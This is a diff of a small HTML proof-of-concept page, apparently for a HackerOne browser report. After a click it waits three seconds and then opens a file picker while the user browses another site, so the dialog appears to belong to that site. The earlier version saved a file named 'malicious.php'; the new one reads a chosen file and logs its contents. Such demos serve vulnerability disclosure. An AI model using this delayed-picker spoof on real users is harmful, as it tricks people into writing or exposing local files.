@@ -1,9 +1,8 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Delayed File Save Picker</title>
+  <title>Delayed File Open Picker</title>
   <style>
     body {
       margin: 0;
@@ -25,29 +24,43 @@
   </style>
 </head>
 <body>
-  <h1>Click me anywhere.<br>Browse to hackerone.com and download the file from HackerOne</h1>
+  <h1>
+    Click me anywhere.<br>
+    Then browse to another site (e.g. hackerone.com)
+  </h1>
 
   <script>
     document.addEventListener('click', async () => {
       setTimeout(async () => {
-        if ('showSaveFilePicker' in window) {
+        if ('showOpenFilePicker' in window) {
           try {
-            const handle = await window.showSaveFilePicker({
-              suggestedName: 'malicious.php',
-              types: [{
-                description: 'Text Files',
-                accept: {'text/plain': ['.php']},
-              }],
+            const [fileHandle] = await window.showOpenFilePicker({
+              multiple: false,
+              types: [
+                {
+                  description: 'Text Files',
+                  accept: {
+                    'text/plain': ['.txt', '.log', '.php']
+                  }
+                }
+              ]
             });
 
-            const writable = await handle.createWritable();
-            await writable.write('This is a test file content.');
-            await writable.close();
+            // Read file content (optional, for demo)
+            const file = await fileHandle.getFile();
+            const content = await file.text();
+
+            console.log("Selected file:", file.name);
+            console.log("Content:", content);
+
           } catch (err) {
-            // User canceled or error occurred — silently ignore
+            // User cancel / error
+            console.log("User canceled or error:", err);
           }
+        } else {
+          alert("showOpenFilePicker not supported in this browser.");
         }
-      }, 3000);
+      }, 3000); // delay 3 detik
     }, { once: true });
   </script>
 </body>
